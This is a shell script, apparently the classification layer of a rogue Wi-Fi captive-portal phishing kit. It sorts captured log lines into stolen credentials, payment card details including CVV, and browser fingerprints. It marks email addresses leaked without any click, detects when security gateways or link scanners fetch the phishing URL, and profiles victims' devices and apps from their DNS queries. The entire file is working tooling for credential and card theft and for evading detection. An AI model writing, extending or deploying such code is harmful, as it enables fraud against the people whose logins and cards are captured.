#!/bin/sh
# triage.sh — pure classification layer for KB Portal Whisperer.
# NO UI commands here on purpose: testable standalone, runnable over plain
# ssh, sourceable by watcher.sh and by the Stop payload. Output = tags.
#
# usage:
#   sh triage.sh cap  < capturelog   -> per line: TAG|SCANNER|GOLD  (. = none)
#   sh triage.sh dns  < dnslog       -> per line: DEVICECLASS or blank
#
# Capture line shapes (device-verified 2026-09-06/07 corp_gate CGIs):
#   POST |ts|ra=IP|ua=UA|user=...|pass=...|host=...
#   FP   |ts|ra=IP|ua=UA|{json}
#   GET  |ts|ra=IP|ua=UA|host=...|ref=...|qs=...
#   CARD |ts|ra=IP|ua=UA|name=...|card=...|exp=...|cvv=...   (card templates)

# link-scanner / safe-browsing crawler tells. 169.254.2.6 = Google link
# fetcher, 169.254.2.7 = Windows SmartScreen/Office preview — a hit here
# means SOMEONE forwarded the portal URL into a chat/mail that auto-fetches.
scanner_of() {
  case "$1" in
    *ra=169.254.2.6*) echo SCAN_GOOGLE; return ;;
    *ra=169.254.2.7*) echo SCAN_MICROSOFT; return ;;
  esac
  case "$1" in
    *Google-Transparency*|*LinkChecker*|*safe-linksbot*) echo SCAN_GOOGLE; return ;;
    *Microsoft-Preview*|*WindowsPreview*|*Defender*) echo SCAN_MICROSOFT; return ;;
    *facebookexternalhit*|*Slackbot*|*TelegramBot*|*WhatsApp*|*Twitterbot*|*Discordbot*) echo SCAN_SOCIAL; return ;;
    *ProofPoint*|*proofpoint*|*Barracuda*|*mimecast*|*Mimecast*|*Forcepoint*|*Zscaler*|*urlresolver*|*PaloAlto*|*SentinelOne*) echo SCAN_GATEWAY; return ;;
  esac
  echo ""
}

triage_line() {
  case "$1" in
    "POST "*"user="*) echo CRED; return ;;
    "POST "*"pass="*) echo CRED; return ;;
    "POST "*"code="*) echo CRED; return ;;
    "CARD "*)         echo CARD; return ;;
    "FP "*)           echo FP;  return ;;
    "GET "*)          echo REQ; return ;;
  esac
  echo ""
}

# GOLD = identifier surrendered with ZERO interaction: link previews and
# captive-redirect query strings carrying an address (%40 = urlencoded @).
# GET lines ONLY — a %40 inside a POST body is an actual form submission
# (already tagged CRED), not zero-click gold. Fix proven by fixture line 1.
gold_of() {
  case "$1" in
    "GET "*) case "$1" in
        *%40*) echo GOLD; return ;;
        *ref=http*user=*@*|*qs=*user=*@*) echo GOLD; return ;;
      esac ;;
  esac
  echo ""
}

# Heuristic device-class from passive DNS (dnsmasq log-queries=extra).
# These are well-known OS/app beacons; output is inference, labeled CLASS.
classify_dns() {
  case "$1" in
    *push.apple.com*|*gateway.icloud*|*xp.apple.com*|*testflight*|*setup.icloud*|*calendarsync*apple*) echo APPLE; return ;;
    *android.googleapis*|*android.clients.google*|*mobile.events.google*|*clientservices.google*|*firebaseremoteconfig*|*play.googleapis*) echo ANDROID_GOOGLE; return ;;
    *msftconnecttest*|*wpad*|*windowsupdate*|*delivery.optimization*|*edge.microsoft*|*go.microsoft*) echo WINDOWS_MS; return ;;
    *samsungads*|*samauth*|*svc.samsung*|*galaxyget*) echo SAMSUNG; return ;;
    *whatsapp.net*|*wa.me*) echo APP_WHATSAPP; return ;;
    *api.telegram*|*telegram.org*) echo APP_TELEGRAM; return ;;
    *discordapp*|*discord.com*) echo APP_DISCORD; return ;;
    *reddit*) echo APP_REDDIT; return ;;
    *instagram*|*graph.facebook*) echo APP_META; return ;;
    *tiktok*) echo APP_TIKTOK; return ;;
    *spotify*) echo APP_SPOTIFY; return ;;
    *cast.google*|*googlehome*|*chromecast*) echo IOT_CHROMECAST; return ;;
    *plex.tv*) echo IOT_PLEX; return ;;
    *xiaomi*|*miio*|*.tuy*|*smartthings*|*homekit*) echo IOT_SMARTHOME; return ;;
  esac
  echo ""
}

# standalone entry (harness + device logic-checks over ssh)
if [ "${1:-}" = cap ] || [ "${1:-}" = dns ]; then
  MODE=$1
  while IFS= read -r L; do
    [ -n "$L" ] || continue
    case "$MODE" in
      cap) T=$(triage_line "$L"); S=$(scanner_of "$L"); G=$(gold_of "$L")
           printf '%s|%s|%s\n' "${T:-.}" "${S:-.}" "${G:-.}" ;;
      dns) C=$(classify_dns "$L"); printf '%s\n' "${C:-.}" ;;
    esac
  done
  exit 0
fi
